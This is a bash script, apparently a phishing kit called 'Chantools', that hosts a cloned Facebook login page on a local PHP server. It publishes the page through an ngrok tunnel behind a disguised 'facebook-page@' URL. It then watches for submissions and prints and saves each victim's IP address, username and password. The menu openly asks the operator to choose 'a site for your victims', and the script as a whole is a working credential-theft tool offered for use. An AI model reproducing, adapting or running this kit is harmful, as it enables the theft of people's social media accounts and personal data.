#!/bin/bash

## text color
BLUE="$(printf '\033[34m')"

## directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -pf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## terminated
exit_on_signal_SIGINT() {
    { printf "Chantool Interrupted." 2>&1;}
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "Chantool Terminated." 2>&1;}
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## kill process already running 
kill_pid() {
	if [[ $(pidof php) ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ $(pidof ngrok) ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

## logo
banner() {
	cat <<- EOF
		CHANTOOLS
	EOF
}

## dependencies
dependencies() {
	echo -e "Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ $(command -v proot) ]]; then
            printf ''
        else
			echo -e "Packages Installing..."
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ $(command -v php) && $(command -v wget) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "Packages has been installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "Installing package"
				
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
					
				else
				
					echo -e "Sorry, your package manager isn't supported this. Just install it manually."
					exit 1
				fi
			}
		done
	fi

}

## downloading ngrok
download_ngrok() {
	url="$1"
	file=$(basename "$url")
	if [[ -e "$file" ]]; then
		rm -pf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -pf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "Downloading failed. Install Ngrok manually."
		exit 1
	fi
}

## installing ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "Ngrok has been installed."
	else
	
		echo -e "Installing ngrok..." 
		arch=$(uname -m)
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## exit msg
exit_msg() {
	{ clear; banner; echo; }
	echo -e "Thanks for using my tools. Ciao!"
	exit 0
}

## abt
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		ulul pakyu
	EOF

	read -p "Select an option :"

	if [[ "$REPLY" == x || "$REPLY" == X ]]; then
		exit_msg
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "Returning to main menu..."
		{ sleep 1; ch_main_menu; }
	else
		echo -ne "Can't identify this option. Kindly, try again."
		{ sleep 1; about; }
	fi
}

## website & php setup
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "start setting up server..."
	cp -pf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "setting up PHP server..." 
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## grabbing IP
grap_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\nVictim's IP : $IP"
	echo -ne "\n-Saved in : ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## grab credentials
grab_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\nAccount : $ACCOUNT"
	echo -e "\nPassword : $PASSWORD"
	echo -e "\nSaved in : usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\nWaiting for another login info. Ctrl + C to exit. "
}

## data print
grab_data() {
	echo -ne "\nWaiting for login info. Type Ctrl + C to exit. "
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\nFound! Victim's IP address l"
			grap_ip
			rm -pf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\nFound! Victim's login info."
			grab_creds
			rm -pf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## start ngrok
ch_start_ngrok() {
	echo -e "\nInitializing... http://$HOST:$PORT"
	{ sleep 1; setup_site; }
	echo -ne "\n\n Launching yout Ngrok link..."

    if [[ $(command -v termux-chroot) ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\nURL 1 : $ngrok_url"
	echo -e "\nURL 2 : $mask@$ngrok_url1"
	grab_data
}

## start the localhost
starting_localhost() {
	echo -e "\nInitializing... (http://$HOST:$PORT)"
	setup_site
	{ sleep 1; clear; banner; }
	echo -e "\nSuccessfully Hosted at : http://$HOST:$PORT"
	grab_data
}

## Tunnel 
menu_tunnel() {
	{ clear; banner; }
	cat <<- EOF

		[01] Localhost for developers
		[02]Ngrok.io for public access

	EOF

	read -p "Select a port forwarding service : "

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		starting_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		ch_start_ngrok
	else
		echo -ne "\nInvalid option. Try Again..."
		{ sleep 1; menu_tunnel; }
	fi
}

## fb
site_fb() {
	cat <<- EOF

		[01] My Facebook Page 
	EOF

	read -p "Select an option :"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://facebook-page'
	else
		echo -ne "\nInvalid Option. Try Again."
		{ sleep 1; clear; banner; site_fb; }
		
	fi
}

## my menu
ch_main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		Choice a site for your victims 

		[01] Facebook 
		[00] exit
		EOF
	
	read -p	"Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_fb
		elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		exit_msg
	else
		echo -ne "Invalid Option, Try Again..."
		{ sleep 1; ch_main_menu; }
	fi
}

## chantools main
kill_pid
dependencies
install_ngrok
ch_main_menu
